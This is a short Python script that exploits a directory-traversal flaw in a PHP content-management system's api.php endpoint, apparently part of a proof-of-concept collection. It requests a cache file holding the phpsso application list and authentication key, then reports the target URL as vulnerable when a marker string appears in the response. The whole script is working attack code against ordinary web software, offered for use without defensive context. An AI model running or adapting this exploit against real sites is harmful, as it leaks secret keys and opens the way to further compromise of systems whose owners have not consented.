#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin"
bug ="aaaaa(["
info ="/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin" 

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()